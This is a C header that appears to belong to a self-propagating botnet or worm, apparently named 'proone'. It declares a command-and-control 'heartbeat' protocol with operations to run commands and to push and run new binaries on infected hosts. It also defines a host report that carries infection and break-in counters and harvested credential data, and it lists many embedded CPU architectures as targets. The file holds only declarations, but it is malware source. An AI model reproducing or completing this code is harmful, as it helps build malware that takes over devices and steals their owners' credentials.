#pragma once
#include "util_ct.h"

#include <stdint.h>
#include <stddef.h>
#include <stdbool.h>

#include <netinet/in.h>


typedef struct prne_net_endpoint prne_net_endpoint_t;
typedef struct prne_ip_addr prne_ip_addr_t;
typedef struct prne_htbt_host_info prne_htbt_host_info_t;
typedef struct prne_htbt_pkt prne_htbt_pkt_t;
typedef struct prne_htbt_cmd prne_htbt_cmd_t;
typedef struct prne_htbt_bin_head prne_htbt_bin_head_t;

typedef enum {
	PRNE_ARCH_NONE = -1,
	
	PRNE_ARCH_ARMV4T,
	PRNE_ARCH_ARMV7,
	PRNE_ARCH_I686,
	PRNE_ARCH_M68K,
	PRNE_ARCH_MIPS,
	PRNE_ARCH_MPSL,
	PRNE_ARCH_PPC,
	PRNE_ARCH_RV32,
	PRNE_ARCH_RV64,
	PRNE_ARCH_SH4,
	PRNE_ARCH_SPC,

	NB_PRNE_ARCH
} prne_arch_t;
PRNE_LIMIT_ENUM(prne_arch_t, NB_PRNE_ARCH, 0xFF);

typedef enum {
	PRNE_IPV_NONE,
	PRNE_IPV_4,
	PRNE_IPV_6
} prne_ipv_t;

_Static_assert(sizeof(struct in_addr) == 4, "sizeof(struct in_addr) == 4");
_Static_assert(sizeof(struct in6_addr) == 16, "sizeof(struct in6_addr) == 16");
struct prne_ip_addr {
	uint8_t addr[16];
	prne_ipv_t ver;
};

struct prne_net_endpoint {
	prne_ip_addr_t addr;
	uint16_t port;
};

typedef enum {
	PRNE_HTBT_OP_NONE,

	PRNE_HTBT_OP_PING,
	PRNE_HTBT_OP_HOST_INFO,
	PRNE_HTBT_OP_HOVER,
	PRNE_HTBT_OP_RUN_CMD,
	PRNE_HTBT_OP_NY_BIN,
	PRNE_HTBT_OP_RUN_BIN,

	NB_PRNE_HTBT_OP
} prne_htbt_op_t;
PRNE_LIMIT_ENUM(prne_htbt_op_t, NB_PRNE_HTBT_OP, 0xFF);

typedef enum {
	PRNE_HTBT_RSPC_OK,
	PRNE_HTBT_RSPC_PROTO_ERR, // followed by nothing
	PRNE_HTBT_RSPC_OP_ERR, // followed by int32_t

	NB_PRNE_HTBT_RSPC
} prne_htbt_rspc_t;
PRNE_LIMIT_ENUM(prne_htbt_rspc_t, NB_PRNE_HTBT_RSPC, 0xFF);

typedef enum {
	PRNE_HTBT_SER_RET_OK,
	PRNE_HTBT_SER_RET_MORE_MEM,
	PRNE_HTBT_SER_RET_FMT_ERR,
} prne_htbt_serialise_ret_t;

typedef enum {
	PRNE_HTBT_DESER_RET_OK,
	PRNE_HTBT_DESER_RET_MORE_DATA,
	PRNE_HTBT_DESER_RET_MEM_ERR,
	PRNE_HTBT_DESER_RET_FMT_ERR,	
} prne_htbt_deserialise_ret_t;

struct prne_htbt_pkt {
	uint16_t id; // != 0
	uint8_t code;
};

struct prne_htbt_host_info {
	char prog_ver[37];
	uint64_t uptime;
	uint64_t rerun_cnt;
	uint64_t bne_cnt;
	uint64_t infect_cnt;
	uint32_t god_pid;
	uint32_t proone_pid;
	uint8_t *cred_data; // (uint8_t)salt + ((uint8_t)id_len + (uint8_t)pw_len + str ...)
	uint16_t cred_data_len; // < 1 + 2 + 255*2
	prne_arch_t arch;
};

struct prne_htbt_cmd {
	char *mem;
	size_t *offset_arr;
	uint8_t argc;
};

struct prne_htbt_bin_head {
	size_t bin_size;
	prne_htbt_cmd_t cmd;
};

static const size_t PRNE_HTBT_PROTO_MIN_BUF = 0;
static const uint16_t PRNE_HTBT_PROTO_PORT = 0;
static const size_t PRNE_HTBT_PROTO_TIMEOUT = 0;


const char *prne_arch_tostr (const prne_arch_t x);
prne_arch_t prne_arch_fstr (const char *str);

void prne_net_ep_tosin4 (const prne_net_endpoint_t *ep, struct sockaddr_in *out);
void prne_net_ep_tosin6 (const prne_net_endpoint_t *ep, struct sockaddr_in6 *out);
bool prne_net_ep_set_ipv4 (const char *str, const uint16_t port, prne_net_endpoint_t *out);
bool prne_net_ep_set_ipv6 (const char *str, const uint16_t port, prne_net_endpoint_t *out);

void prne_htbt_init_pkt (prne_htbt_pkt_t *pkt);
void prne_htbt_init_host_into (prne_htbt_host_info_t *hi);
void prne_htbt_alloc_host_into (prne_htbt_host_info_t *hi, const uint16_t cred_data_len);
void prne_htbt_free_host_into (prne_htbt_host_info_t *hi);
void prne_htbt_init_cmd (prne_htbt_cmd_t *cmt);
void prne_htbt_alloc_cmd (prne_htbt_cmd_t *cmt, const uint8_t argc, const uint16_t total_str_len);
void prne_htbt_free_cmd (prne_htbt_cmd_t *cmt);
void prne_htbt_init_bin_head (prne_htbt_bin_head_t *nb);
void prne_htbt_free_bin_head (prne_htbt_bin_head_t *nb);

// prne_htbt_serialise_ret_t prne_htbt_serialise_ (uint8_t *mem, const size_t mem_len, size_t *actual, const something_t *in);
prne_htbt_serialise_ret_t prne_htbt_serialise_pkt (uint8_t *mem, const size_t mem_len, size_t *actual, const prne_htbt_pkt_t *in);
prne_htbt_serialise_ret_t prne_htbt_serialise_host_info (uint8_t *mem, const size_t mem_len, size_t *actual, const prne_htbt_host_info_t *in);
prne_htbt_serialise_ret_t prne_htbt_serialise_int32 (uint8_t *mem, const size_t mem_len, size_t *actual, const int32_t in);
prne_htbt_serialise_ret_t prne_htbt_serialise_cmd (uint8_t *mem, const size_t mem_len, size_t *actual, const prne_htbt_cmd_t *in);
prne_htbt_serialise_ret_t prne_htbt_serialise_bin_head (uint8_t *mem, const size_t mem_len, size_t *actual, const prne_htbt_bin_head_t *in);

// prne_htbt_deserialise_ret_t prne_htbt_deserialise_ (const uint8_t *data, const size_t len, size_t *actual, something_t *out);
prne_htbt_deserialise_ret_t prne_htbt_deserialise_pkt (const uint8_t *data, const size_t len, size_t *actual, prne_htbt_pkt_t *out);
prne_htbt_deserialise_ret_t prne_htbt_deserialise_host_info (const uint8_t *data, const size_t len, size_t *actual, prne_htbt_host_info_t *out);
prne_htbt_deserialise_ret_t prne_htbt_deserialise_int32 (const uint8_t *data, const size_t len, size_t *actual, int32_t *out);
prne_htbt_deserialise_ret_t prne_htbt_deserialise_cmd (const uint8_t *data, const size_t len, size_t *actual, prne_htbt_cmd_t *out);
prne_htbt_deserialise_ret_t prne_htbt_deserialise_bin_head (const uint8_t *data, const size_t len, size_t *actual, prne_htbt_bin_head_t *out);
